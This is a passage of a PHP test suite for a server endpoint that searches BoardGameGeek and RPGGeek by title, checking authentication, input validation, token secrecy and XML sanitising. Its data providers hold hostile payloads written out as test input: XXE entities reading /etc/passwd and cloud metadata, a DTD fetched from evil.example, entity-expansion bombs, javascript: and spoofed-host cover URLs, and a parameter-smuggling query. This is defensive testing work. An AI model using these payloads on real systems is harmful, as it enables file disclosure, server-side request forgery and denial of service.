<?php

declare(strict_types=1);

namespace App\Tests\Controller;

use App\Entity\ActivityEntry;
use App\Entity\MetadataCacheEntry;
use App\Entity\User;
use App\Metadata\BggSearch;
use App\Security\RequestLimiter;
use App\Tests\Support\DeviceAuthTestTrait;
use App\Tests\Support\FakeBggApi;
use App\Tests\Support\RecordingLogger;
use Doctrine\ORM\EntityManagerInterface;
use PHPUnit\Framework\Attributes\DataProvider;
use Symfony\Bundle\FrameworkBundle\KernelBrowser;
use Symfony\Bundle\FrameworkBundle\Test\MailerAssertionsTrait;
use Symfony\Bundle\FrameworkBundle\Test\WebTestCase;
use Symfony\Component\HttpClient\Exception\TransportException;
use Symfony\Component\Uid\Uuid;

/**
 * Searching board games (BoardGameGeek) and role-playing books (RPGGeek) by title through the server (7.8, D62). The
 * title a person looks for never travels in an address, is never kept in the clear and never reaches a log; the token
 * is nowhere; the XML that comes back is from outside and may be hostile; and BoardGameGeek's terms forbid changing its
 * data, so a value that does not fit is dropped whole, never cut. The XML of the fake is written by hand after the
 * documentation: nothing was recorded from the real service.
 */
final class BggSearchTest extends WebTestCase
{
    use DeviceAuthTestTrait;
    use MailerAssertionsTrait;

    private const string TOKEN = 'SENTINEL-bgg-token-5d1e';
    private const string SECRET_TITLE = 'zxqv private title';

    protected function tearDown(): void
    {
        $_ENV['BGG_API_TOKEN'] = $_SERVER['BGG_API_TOKEN'] = '';
        $_ENV['BGG_DAILY_CALL_CAP'] = $_SERVER['BGG_DAILY_CALL_CAP'] = '1000';
        FakeBggApi::reset();
        RecordingLogger::reset();
        parent::tearDown();
    }

    // --- The way -----------------------------------------------------------------------------------------------------

    public function testABoardGameSearchGivesTheFixedShapeWithItsDetailInOneCall(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        FakeBggApi::searchFinds([FakeBggApi::searchItem(13, 'CATAN'), FakeBggApi::searchItem(926, 'Catan: Seafarers', 'boardgameexpansion', 1997)]);
        FakeBggApi::detailsAre([FakeBggApi::game(13), FakeBggApi::game(926, 'Catan: Seafarers', [13, 'CATAN'])]);

        $body = $this->search($client, $ada, 'boardgame', 'catan');

        self::assertResponseStatusCodeSame(200);
        self::assertSame(['candidates'], array_keys($body));
        $cover = 'https://cf.geekdo-images.com/W3Bsga_uLP9kO91gZ7H8yw__original/img/o18bjC1GpdDPSHpdYqmZ2eLuUVU=/0x0/filters:format(jpeg)/pic2419375.jpg';
        self::assertSame([
            'external_id' => 13,
            'title' => 'CATAN',
            'year' => 1995,
            'cover_url' => $cover,
            'publisher' => 'KOSMOS',
            'designers' => ['Klaus Teuber'],
            'artists' => ['Volkan Baga', 'Michael Menzel'],
            'players_min' => 3,
            'players_max' => 4,
            'duration_minutes' => 120,
            'min_age' => 10,
            'expands' => null,
        ], $this->candidates($body)[0]);
        self::assertSame(['external_id' => 13, 'title' => 'CATAN'], $this->candidates($body)[1]['expands']);
        self::assertSame(1997, $this->candidates($body)[1]['year']);

        self::assertSame(2, FakeBggApi::calls(), 'one search and one call for all the details');
        $search = FakeBggApi::$requests[0];
        self::assertSame('GET', $search['method']);
        self::assertSame('boardgamegeek.com', $search['host']);
        self::assertSame('/xmlapi2/search', $search['path']);
        self::assertSame('catan', $search['query']['query'] ?? null);
        self::assertSame('boardgame,boardgameexpansion', $search['query']['type'] ?? null);
        self::assertSame(['Authorization: Bearer '.self::TOKEN], $search['headers']['authorization'] ?? null);
        self::assertStringNotContainsString(self::TOKEN, $search['url']);
        $detail = FakeBggApi::$requests[1];
        self::assertSame('/xmlapi2/thing', $detail['path']);
        self::assertSame('13,926', $detail['query']['id'] ?? null);
        self::assertSame(['Authorization: Bearer '.self::TOKEN], $detail['headers']['authorization'] ?? null);
        self::assertStringNotContainsString(self::TOKEN, $detail['url']);
    }

    public function testTheDescriptionIsNeverUsed(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        FakeBggApi::searchFinds([FakeBggApi::searchItem()]);
        FakeBggApi::detailsAre([FakeBggApi::game()]);

        $answer = $this->raw($client, $ada, 'boardgame', 'catan');

        self::assertStringNotContainsString('Wikipedia', $answer);
        self::assertStringNotContainsString('description', $answer);
        foreach ($this->allCacheRowsAsText() as $row) {
            self::assertStringNotContainsString('Wikipedia', $row);
        }
    }

    public function testARoleplayingSearchAsksRpggeekAndGivesNoGameFields(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        FakeBggApi::searchFinds([FakeBggApi::searchItem(4000, 'Dungeon Master’s Guide', 'rpgitem', 1979)]);
        FakeBggApi::detailsAre([FakeBggApi::book()]);

        $body = $this->search($client, $ada, 'rpg', 'dungeon master');

        self::assertResponseStatusCodeSame(200);
        $candidate = $this->candidates($body)[0];
        self::assertSame('Dungeon Master’s Guide', $candidate['title']);
        self::assertSame(['Gary Gygax'], $candidate['designers']);
        self::assertSame(['David Sutherland'], $candidate['artists']);
        self::assertSame('TSR', $candidate['publisher']);
        self::assertNull($candidate['players_min']);
        self::assertNull($candidate['duration_minutes']);
        self::assertNull($candidate['expands']);
        // Tried on 17/10/2026: rpggeek.com answers a Cloudflare challenge; `rpgitem` works on boardgamegeek.com.
        self::assertSame('boardgamegeek.com', FakeBggApi::$requests[0]['host']);
        self::assertSame('rpgitem', FakeBggApi::$requests[0]['query']['type'] ?? null);
        self::assertSame('boardgamegeek.com', FakeBggApi::$requests[1]['host']);
    }

    /**
     * What BoardGameGeek really answered to "catan" on 17/10/2026: 286 results in no order of relevance, the game
     * itself fifth, the first ones matched by an alternate name. The first eight would have been the wrong eight.
     */
    public function testTheResultsAreRankedAndNotJustTheFirstOnes(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        $items = [
            FakeBggApi::searchItem(134277, 'The 7 Wonders of Catan (fan expansion for Catan)', 'boardgame', 2012),
            FakeBggApi::searchItem(110308, '7 Wonders: Catan', 'boardgame', 2011),
            FakeBggApi::searchItem(123386, 'Baden-Württemberg Catan', 'boardgame', 2012),
            FakeBggApi::searchItem(5824, 'Barna fra Catan', 'boardgame', 2003),
            FakeBggApi::searchItem(13, 'Catan', 'boardgame', 1995),
            FakeBggApi::searchItem(926, 'Catan: Cities & Knights', 'boardgameexpansion', 1998),
            FakeBggApi::searchItem(2000, 'catan', 'boardgameexpansion', 2001),
            FakeBggApi::searchItem(2001, 'Catan Junior', 'boardgame', 2007),
        ];
        for ($i = 0; $i < 60; ++$i) {
            $items[] = FakeBggApi::searchItem(3000 + $i, 'Filler about catan '.$i);
        }
        $items[] = FakeBggApi::searchItem(4000, 'Catan: Seafarers', 'boardgameexpansion', 1997);
        FakeBggApi::searchFinds($items);
        FakeBggApi::detailsAre([]);

        $body = $this->search($client, $ada, 'boardgame', 'Catan');

        $ids = array_column($this->candidates($body), 'external_id');
        self::assertCount(8, $ids);
        // What is called exactly that first, then what starts with the words, then what holds them; a game before an
        // expansion in each group, then the shorter title, and BoardGameGeek's own order when they are as long.
        self::assertSame([13, 2000, 2001, 4000, 926, 5824, 110308, 3000], $ids);
        self::assertSame(implode(',', $ids), FakeBggApi::$requests[1]['query']['id'] ?? null);
    }

    public function testAnItemOfAnotherTypeIsNotAResult(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        FakeBggApi::searchFinds([FakeBggApi::searchItem(1, 'Some game', 'boardgame'), FakeBggApi::searchItem(2, 'A book', 'rpgitem'), FakeBggApi::searchItem(3, 'A magazine', 'rpgissue')]);
        FakeBggApi::detailsAre([FakeBggApi::game(1, 'Some game')]);

        $body = $this->search($client, $ada, 'boardgame', 'some');

        self::assertSame([1], array_column($this->candidates($body), 'external_id'));
    }

    public function testNothingFoundIsAnAnswerAndIsRemembered(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        FakeBggApi::searchFinds([]);

        $first = $this->search($client, $ada, 'boardgame', 'qwertyuiop');
        $second = $this->search($client, $ada, 'boardgame', 'qwertyuiop');

        self::assertResponseStatusCodeSame(200);
        self::assertSame(['candidates' => []], $first);
        self::assertSame($first, $second);
        self::assertSame(1, FakeBggApi::calls());
    }

    public function testTheSameTextInTheOtherScopeIsAnotherSearch(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        FakeBggApi::searchFinds([]);
        FakeBggApi::searchFinds([]);

        $this->search($client, $ada, 'boardgame', 'dune');
        $this->search($client, $ada, 'rpg', 'dune');

        self::assertSame(2, FakeBggApi::calls());
    }

    public function testTheServerListsBggOnlyWithAToken(): void
    {
        $client = $this->world();
        $client->request('GET', '/v1/server');
        self::assertContains('bgg', $this->offered($client));

        $_ENV['BGG_API_TOKEN'] = $_SERVER['BGG_API_TOKEN'] = '';
        self::ensureKernelShutdown();
        $client = self::createClient();
        $client->request('GET', '/v1/server');
        self::assertNotContains('bgg', $this->offered($client));
    }

    public function testWithoutATokenTheRouteIsUnavailableAndNobodyIsAsked(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        $_ENV['BGG_API_TOKEN'] = $_SERVER['BGG_API_TOKEN'] = '';
        self::ensureKernelShutdown();
        $client = self::createClient();

        $body = $this->search($client, $ada, 'boardgame', 'catan');

        self::assertResponseStatusCodeSame(404);
        self::assertSame('metadata_unavailable', $body['error'] ?? null);
        self::assertSame(0, FakeBggApi::calls());
        self::assertSame(0, $this->cacheRows());
    }

    // --- 1. Who may ask -----------------------------------------------------------------------------------------------

    public function testWithoutASessionThereIsNoAnswerAndNoCall(): void
    {
        $client = $this->world();

        $client->request('POST', '/v1/metadata/bgg/search', server: ['CONTENT_TYPE' => 'application/json'], content: $this->payload('boardgame', 'catan'));

        self::assertResponseStatusCodeSame(401);
        self::assertSame(0, FakeBggApi::calls());
    }

    public function testAnInvalidTokenGetsNoAnswerAndNoCall(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');

        $this->search($client, ['headers' => $this->deviceHeaders($ada['device_id'], 'nope')], 'boardgame', 'catan');

        self::assertResponseStatusCodeSame(401);
        self::assertSame(0, FakeBggApi::calls());
    }

    public function testAnAccountNoLongerConfirmedGetsNoAnswerAndNoCall(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        $this->entityManager()->createQuery(\sprintf('UPDATE %s u SET u.confirmedAt = NULL', User::class))->execute();

        $body = $this->search($client, $ada, 'boardgame', 'catan');

        self::assertResponseStatusCodeSame(403);
        self::assertSame('account_not_confirmed', $body['error'] ?? null);
        self::assertSame(0, FakeBggApi::calls());
    }

    public function testABlockedAccountGetsNoAnswerAndNoCall(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        $this->user('ada@example.com')->block(new \DateTimeImmutable());
        $this->entityManager()->flush();

        $body = $this->search($client, $ada, 'boardgame', 'catan');

        self::assertResponseStatusCodeSame(403);
        self::assertSame('account_blocked', $body['error'] ?? null);
        self::assertSame(0, FakeBggApi::calls());
    }

    // --- 2. A body that is not the one asked -------------------------------------------------------------------------

    /** @return iterable<string, array{string}> */
    public static function badBodies(): iterable
    {
        yield 'a scope that is not on the list' => ['{"scope":"book","query":"catan"}'];
        yield 'a scope with another host in it' => ['{"scope":"rpggeek.com","query":"catan"}'];
        yield 'no scope' => ['{"query":"catan"}'];
        yield 'a scope that is not text' => ['{"scope":["rpg"],"query":"catan"}'];
        yield 'an empty query' => ['{"scope":"rpg","query":""}'];
        yield 'a query of blanks' => ['{"scope":"rpg","query":"   "}'];
        yield 'a query of one letter' => ['{"scope":"rpg","query":"a"}'];
        yield 'no query' => ['{"scope":"rpg"}'];
        yield 'a query that is not text' => ['{"scope":"rpg","query":{"a":1}}'];
        yield 'a line break' => ['{"scope":"rpg","query":"ca\ntan"}'];
        yield 'a tab' => ['{"scope":"rpg","query":"ca\ttan"}'];
        yield 'a null byte' => ['{"scope":"rpg","query":"ca\u0000tan"}'];
        yield 'a control character' => ['{"scope":"rpg","query":"ca\u0007tan"}'];
        yield 'more fields' => ['{"scope":"rpg","query":"catan","token":"x"}'];
        yield 'a host of its own' => ['{"scope":"rpg","query":"catan","host":"evil.example"}'];
        yield 'broken json' => ['{"scope":"rpg","query":"catan"'];
        yield 'a list' => ['["rpg","catan"]'];
        yield 'a string' => ['"catan"'];
        yield 'nothing' => [''];
    }

    #[DataProvider('badBodies')]
    public function testABodyThatIsNotTheOneAskedIsRefusedWithoutBggAndWithoutARow(string $body): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');

        $client->request('POST', '/v1/metadata/bgg/search', server: $ada['headers'] + ['CONTENT_TYPE' => 'application/json'], content: $body);

        self::assertGreaterThanOrEqual(400, $client->getResponse()->getStatusCode());
        self::assertLessThan(500, $client->getResponse()->getStatusCode());
        self::assertSame(0, FakeBggApi::calls());
        self::assertSame(0, $this->cacheRows());
    }

    public function testAQueryOfOneOverTheLimitAndOfAMegabyteAreRefused(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');

        $this->raw($client, $ada, 'boardgame', str_repeat('a', 101));
        self::assertResponseStatusCodeSame(422);
        $this->raw($client, $ada, 'boardgame', str_repeat('a', 1024 * 1024));
        self::assertGreaterThanOrEqual(400, $client->getResponse()->getStatusCode());
        self::assertSame(0, FakeBggApi::calls());
        self::assertSame(0, $this->cacheRows());
    }

    public function testSurroundingBlanksAndRepeatedSpacesDoNotChangeWhatIsAsked(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        FakeBggApi::searchFinds([]);

        $this->search($client, $ada, 'boardgame', "  Ticket   TO\u{a0}Ride ");
        $this->search($client, $ada, 'boardgame', 'ticket to ride');

        self::assertSame(1, FakeBggApi::calls());
        self::assertSame('ticket to ride', FakeBggApi::$requests[0]['query']['query'] ?? null);
    }

    public function testATitleWithSymbolsTravelsAsOneEncodedParameter(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        FakeBggApi::searchFinds([]);

        $this->search($client, $ada, 'boardgame', 'a&type=rpgitem&id=1?x=2#y/../z%00');

        self::assertSame(1, FakeBggApi::calls());
        $request = FakeBggApi::$requests[0];
        self::assertSame('/xmlapi2/search', $request['path']);
        self::assertSame('boardgame,boardgameexpansion', $request['query']['type'] ?? null);
        self::assertSame('a&type=rpgitem&id=1?x=2#y/../z%00', $request['query']['query'] ?? null);
        self::assertSame(['query', 'type'], array_keys($request['query']));
    }

    // --- 3. The token --------------------------------------------------------------------------------------------------

    public function testTheTokenIsNowhereInWhatTheServerAnswersStoresOrLogs(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        $seen = [];
        $n = 0;

        foreach ([401, 429, 500, 404, 202] as $status) {
            $times = \in_array($status, [500, 202], true) ? 3 : 1;
            for ($i = 0; $i < $times; ++$i) {
                FakeBggApi::searchAnswers($status, '<error>bad token '.self::TOKEN.'</error>');
            }
            $this->clearBrake();
            $seen[] = $this->raw($client, $ada, 'boardgame', 'query '.++$n);
        }
        FakeBggApi::searchFails(new TransportException('Could not resolve https://boardgamegeek.com/xmlapi2/search with '.self::TOKEN));
        $this->clearBrake();
        $seen[] = $this->raw($client, $ada, 'boardgame', 'query '.++$n);
        FakeBggApi::searchFinds([FakeBggApi::searchItem()]);
        FakeBggApi::detailAnswers(500, self::TOKEN);
        $this->clearBrake();
        $seen[] = $this->raw($client, $ada, 'boardgame', 'query '.++$n);
        FakeBggApi::searchFinds([FakeBggApi::searchItem(14)]);
        FakeBggApi::detailFails(new TransportException('Failed with '.self::TOKEN));
        $this->clearBrake();
        $seen[] = $this->raw($client, $ada, 'boardgame', 'query '.++$n);

        foreach ($seen as $answer) {
            self::assertStringNotContainsString(self::TOKEN, $answer);
        }
        foreach ($this->allCacheRowsAsText() as $row) {
            self::assertStringNotContainsString(self::TOKEN, $row);
        }
        self::assertStringNotContainsString(self::TOKEN, RecordingLogger::everything());
    }

    // --- 4. XML that is not plain -------------------------------------------------------------------------------------

    /** @return iterable<string, array{string}> */
    public static function hostileXml(): iterable
    {
        yield 'an external entity read from a file' => ['<?xml version="1.0"?><!DOCTYPE items [<!ENTITY x SYSTEM "file:///etc/passwd">]><items><item type="boardgame" id="1"><name type="primary" value="&x;"/></item></items>'];
        yield 'an external entity read from the network' => ['<?xml version="1.0"?><!DOCTYPE items [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data">]><items><item type="boardgame" id="1"><name type="primary" value="&x;"/></item></items>'];
        yield 'a parameter entity' => ['<?xml version="1.0"?><!DOCTYPE items [<!ENTITY % x SYSTEM "http://evil.example/x.dtd"> %x;]><items/>'];
        yield 'an expansion bomb' => ['<?xml version="1.0"?><!DOCTYPE items [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]><items><item type="boardgame" id="1"><name type="primary" value="&c;"/></item></items>'];
        yield 'a document type without entities' => ['<?xml version="1.0"?><!DOCTYPE items><items/>'];
        yield 'a lower case document type' => ['<?xml version="1.0"?><!doctype items><items/>'];
        yield 'a document type split by a space' => ['<?xml version="1.0"?><! DOCTYPE items><items/>'];
        yield 'another encoding that hides the document type' => [mb_convert_encoding('<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE items [<!ENTITY x SYSTEM "file:///etc/passwd">]><items/>', 'UTF-16LE', 'UTF-8')];
        yield 'another encoding declared' => ['<?xml version="1.0" encoding="ISO-8859-1"?><items/>'];
        yield 'a null byte' => ["<?xml version=\"1.0\"?><items>\0</items>"];
        yield 'not UTF-8' => ["<?xml version=\"1.0\"?><items><item type=\"boardgame\" id=\"1\"><name type=\"primary\" value=\"Caf\xE9\"/></item></items>"];
        yield 'not xml' => ['{"items":[]}'];
        yield 'broken xml' => ['<items><item type="boardgame" id="1"'];
        yield 'another root' => ['<html><body>Rate limit</body></html>'];
        yield 'nothing' => [''];
        yield 'a hundred thousand levels' => [str_repeat('<a>', 100_000)];
    }

    #[DataProvider('hostileXml')]
    public function testXmlThatIsNotPlainIsAFailureAndLeavesNoRowAndNothingFromTheOutside(string $xml): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        FakeBggApi::searchAnswers(200, $xml);

        $answer = $this->raw($client, $ada, 'boardgame', 'catan');

        self::assertResponseStatusCodeSame(502);
        self::assertSame('metadata_failed', $this->decodeText($answer)['error'] ?? null);
        self::assertStringNotContainsString('root:', $answer);
        self::assertStringNotContainsString('169.254', $answer);
        self::assertSame(1, FakeBggApi::calls(), 'nothing is asked again, and nothing else is asked');
        self::assertSame(0, $this->cacheRows());
    }

    public function testHostileXmlInADetailLeavesTheCandidateWithoutItAndKeepsNothingFromIt(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        FakeBggApi::searchFinds([FakeBggApi::searchItem()]);
        FakeBggApi::detailAnswers(200, '<?xml version="1.0"?><!DOCTYPE items [<!ENTITY x SYSTEM "file:///etc/passwd">]><items><item type="boardgame" id="13"><name type="primary" value="&x;"/></item></items>');

        $answer = $this->raw($client, $ada, 'boardgame', 'catan');

        self::assertResponseStatusCodeSame(200);
        $candidate = $this->candidates($this->decodeText($answer))[0];
        self::assertSame('CATAN', $candidate['title']);
        self::assertNull($candidate['publisher']);
        self::assertStringNotContainsString('root:', $answer);
        // What it answered is no use: kept as missing, with nothing in it, for an hour (SEG-053).
        $row = $this->entityManager()->getRepository(MetadataCacheEntry::class)->findOneBy(['provider' => 'bgg_boardgame']) ?? self::fail('No row.');
        self::assertFalse($row->isFound());
        self::assertSame([], $row->getPayload());
    }

    public function testAnEnormousAnswerIsAFailureAndLeavesNoRow(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        FakeBggApi::searchAnswers(200, FakeBggApi::items([str_repeat(' ', 3 * 1024 * 1024)]));

        $this->search($client, $ada, 'boardgame', 'catan');

        self::assertResponseStatusCodeSame(502);
        self::assertSame(0, $this->cacheRows());
    }

    // --- 5. Values that do not fit are dropped whole, never cut ---------------------------------------------------------

    public function testAThousandResultsReachTheAppAsEightAndTheirDetailsAreAskedInOneCall(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        $items = [];
        $games = [];
        for ($i = 1; $i <= 1000; ++$i) {
            $items[] = FakeBggApi::searchItem($i, 'Game '.$i);
            if ($i <= 8) {
                $games[] = FakeBggApi::game($i, 'Game '.$i);
            }
        }
        FakeBggApi::searchFinds($items);
        FakeBggApi::detailsAre($games);

        $body = $this->search($client, $ada, 'boardgame', 'game');

        self::assertCount(8, $this->candidates($body));
        self::assertSame(2, FakeBggApi::calls());
        self::assertSame('1,2,3,4,5,6,7,8', FakeBggApi::$requests[1]['query']['id'] ?? null);
    }

    public function testATitleThatIsTooLongIsDroppedWholeAndNotCut(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        $long = str_repeat('x', 301);
        FakeBggApi::searchFinds([FakeBggApi::searchItem(1, $long), FakeBggApi::searchItem(2, str_repeat('y', 300))]);
        FakeBggApi::detailsAre([FakeBggApi::game(2, str_repeat('y', 300))]);

        $answer = $this->raw($client, $ada, 'boardgame', 'catan');

        $candidates = $this->candidates($this->decodeText($answer));
        self::assertSame([2], array_column($candidates, 'external_id'));
        self::assertSame(str_repeat('y', 300), $candidates[0]['title']);
        self::assertStringNotContainsString('xxx', $answer);
    }

    public function testADetailValueThatIsTooLongOrHiddenIsDroppedWholeAndTheRestStays(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        FakeBggApi::searchFinds([FakeBggApi::searchItem()]);
        FakeBggApi::detailsAre(['<item type="boardgame" id="13"><image>https://cf.geekdo-images.com/a/pic1.jpg</image><name type="primary" value="CATAN"/>'
            .'<minplayers value="3"/><link type="boardgamepublisher" id="1" value="'.str_repeat('p', 301).'"/><link type="boardgamepublisher" id="2" value="KOSMOS"/>'
            .'<link type="boardgamedesigner" id="3" value="Klaus&#x202E;Teuber"/><link type="boardgamedesigner" id="4" value="Klaus Teuber"/>'
            .'</item>']);

        $answer = $this->raw($client, $ada, 'boardgame', 'catan');

        $candidate = $this->candidates($this->decodeText($answer))[0];
        self::assertSame('KOSMOS', $candidate['publisher']);
        self::assertSame(['Klaus Teuber'], $candidate['designers']);
        self::assertSame(3, $candidate['players_min']);
        self::assertStringNotContainsString('ppp', $answer);
    }

    public function testNumbersThatCannotBeRealAreDropped(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        FakeBggApi::searchFinds([FakeBggApi::searchItem(13, 'CATAN', 'boardgame', -3000), FakeBggApi::searchItem(14, 'Other', 'boardgame', 'soon')]);
        FakeBggApi::detailsAre(['<item type="boardgame" id="13"><name type="primary" value="CATAN"/><minplayers value="0"/><maxplayers value="-4"/><playingtime value="99999999"/><minage value="12abc"/></item>',
            '<item type="boardgame" id="14"><name type="primary" value="Other"/><minplayers value="1e3"/><maxplayers value=" 4 "/></item>']);

        $candidates = $this->candidates($this->search($client, $ada, 'boardgame', 'catan'));

        foreach ([0, 1] as $i) {
            self::assertNull($candidates[$i]['year']);
            self::assertNull($candidates[$i]['players_min']);
            self::assertNull($candidates[$i]['duration_minutes']);
            self::assertNull($candidates[$i]['min_age']);
        }
        self::assertNull($candidates[0]['players_max']);
        self::assertSame(4, $candidates[1]['players_max']);
    }

    public function testIdsThatAreNotNumbersOrWereNotAskedAreIgnored(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        FakeBggApi::searchFinds([
            FakeBggApi::searchItem(13),
            '<item type="boardgame" id="12abc"><name type="primary" value="Bad id"/></item>',
            '<item type="boardgame" id="0"><name type="primary" value="Zero"/></item>',
            '<item type="boardgame" id="99999999999"><name type="primary" value="Huge"/></item>',
            '<item type="boardgame"><name type="primary" value="No id"/></item>',
            '<item type="boardgame" id="15"><name type="primary" value=""/></item>',
            '<item type="boardgame" id="16"/>',
        ]);
        FakeBggApi::detailsAre([FakeBggApi::game(999, 'Nobody asked'), FakeBggApi::game(13)]);

        $answer = $this->raw($client, $ada, 'boardgame', 'catan');

        $candidates = $this->candidates($this->decodeText($answer));
        self::assertSame([13], array_column($candidates, 'external_id'));
        self::assertSame('CATAN', $candidates[0]['title']);
        self::assertStringNotContainsString('Nobody asked', $answer);
        self::assertSame('13', FakeBggApi::$requests[1]['query']['id'] ?? null);
    }

    /** @return iterable<string, array{string}> */
    public static function covers(): iterable
    {
        yield 'another host' => ['https://evil.example/pic1.jpg'];
        yield 'the host as a prefix of another' => ['https://cf.geekdo-images.com.evil.example/pic1.jpg'];
        yield 'the host after an at sign' => ['https://cf.geekdo-images.com@evil.example/pic1.jpg'];
        yield 'plain http' => ['http://cf.geekdo-images.com/pic1.jpg'];
        yield 'a dot dot' => ['https://cf.geekdo-images.com/a/../../pic1.jpg'];
        yield 'another address inside' => ['https://cf.geekdo-images.com/https://evil.example/pic1.jpg'];
        yield 'a query' => ['https://cf.geekdo-images.com/pic1.jpg?x=1'];
        yield 'an extension that is not an image' => ['https://cf.geekdo-images.com/pic1.php'];
        yield 'a script' => ['javascript:alert(1)'];
        yield 'a data address' => ['data:image/png;base64,AAAA'];
        yield 'a backslash' => ['https://cf.geekdo-images.com/a\\b.jpg'];
        yield 'a space' => ['https://cf.geekdo-images.com/a b.jpg'];
        yield 'a protocol relative one' => ['//cf.geekdo-images.com/pic1.jpg'];
    }

    #[DataProvider('covers')]
    public function testACoverThatIsNotOnTheirImageHostAsAPlainFileIsDropped(string $cover): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        FakeBggApi::searchFinds([FakeBggApi::searchItem()]);
        FakeBggApi::detailsAre([FakeBggApi::game(13, 'CATAN', null, $cover)]);

        $candidate = $this->candidates($this->search($client, $ada, 'boardgame', 'catan'))[0];

        self::assertNull($candidate['cover_url']);
        self::assertSame('KOSMOS', $candidate['publisher']);
    }

    public function testACoverInTheCacheThatTheSiteCouldNotHaveSentIsDropped(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        $this->store('bgg_search', BggSearch::fingerprint('boardgame', 'catan'), true, ['hits' => [['external_id' => 13, 'title' => 'CATAN', 'year' => 1995]]], new \DateTimeImmutable());
        $this->store('bgg_boardgame', '13', true, ['title' => 'CATAN', 'cover_url' => 'javascript:alert(1)', 'publisher' => str_repeat('p', 301), 'designers' => ['A', 12, "B\x07"], 'artists' => [], 'players_min' => 3, 'players_max' => -1, 'duration_minutes' => null, 'min_age' => null, 'expands' => ['external_id' => 'x', 'title' => 'Y']], new \DateTimeImmutable());

        $candidate = $this->candidates($this->search($client, $ada, 'boardgame', 'catan'))[0];

        self::assertSame(0, FakeBggApi::calls());
        self::assertNull($candidate['cover_url']);
        self::assertNull($candidate['publisher']);
        self::assertSame(['A'], $candidate['designers']);
        self::assertSame(3, $candidate['players_min']);
        self::assertNull($candidate['players_max']);
        self::assertNull($candidate['expands']);
    }

    public function testOnlyTheFirstExpandedGameIsKeptAndOnlyIfItIsInbound(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        FakeBggApi::searchFinds([FakeBggApi::searchItem(926, 'Seafarers', 'boardgameexpansion')]);
        FakeBggApi::detailsAre(['<item type="boardgameexpansion" id="926"><name type="primary" value="Seafarers"/>'
            .'<link type="boardgameexpansion" id="500" value="Not this: it is outbound"/>'
            .'<link type="boardgameexpansion" id="x" value="Not this: no number" inbound="true"/>'
            .'<link type="boardgameexpansion" id="13" value="CATAN" inbound="true"/><link type="boardgameexpansion" id="14" value="Another" inbound="true"/></item>']);

        $candidate = $this->candidates($this->search($client, $ada, 'boardgame', 'seafarers'))[0];

        self::assertSame(['external_id' => 13, 'title' => 'CATAN'], $candidate['expands']);
    }

    // --- 6. A site that says no -----------------------------------------------------------------------------------------

    /** @return iterable<string, array{int}> */
    public static function refusals(): iterable
    {
        yield 'too many requests' => [429];
        yield 'unauthorised' => [401];
        yield 'forbidden' => [403];
    }

    #[DataProvider('refusals')]
    public function testARefusalIsReportedAndNothingIsStored(int $status): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        FakeBggApi::searchAnswers($status, '<error/>');

        $body = $this->search($client, $ada, 'boardgame', 'catan');

        self::assertResponseStatusCodeSame(503);
        self::assertSame('metadata_quota_exhausted', $body['error'] ?? null);
        self::assertSame(0, $this->cacheRows());
    }

    public function testAfterARefusalTheServerStopsAskingThatSiteForAWhileAndOnlyThatOne(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        $grace = $this->account($client, 'grace@example.com');
        FakeBggApi::searchAnswers(401, '<error/>');
        $this->search($client, $ada, 'rpg', 'dune');
        self::assertSame(1, FakeBggApi::calls());

        $this->search($client, $grace, 'rpg', 'other');
        self::assertResponseStatusCodeSame(503);
        self::assertSame(1, FakeBggApi::calls(), 'RPGGeek is left alone');

        FakeBggApi::searchFinds([]);
        $this->search($client, $grace, 'boardgame', 'other');
        self::assertResponseStatusCodeSame(200);
        self::assertSame(2, FakeBggApi::calls(), 'BoardGameGeek is still asked');
    }

    public function testAServerErrorIsTriedAgainAndThenAnswers(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        FakeBggApi::searchAnswers(500, 'oops');
        FakeBggApi::searchFinds([]);

        $body = $this->search($client, $ada, 'boardgame', 'catan');

        self::assertResponseStatusCodeSame(200);
        self::assertSame(['candidates' => []], $body);
        self::assertSame(2, FakeBggApi::searchCalls());
    }

    public function testAnAnswerThatIsQueuedIsAskedAgainAndThenAnswers(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        FakeBggApi::searchAnswers(202, '');
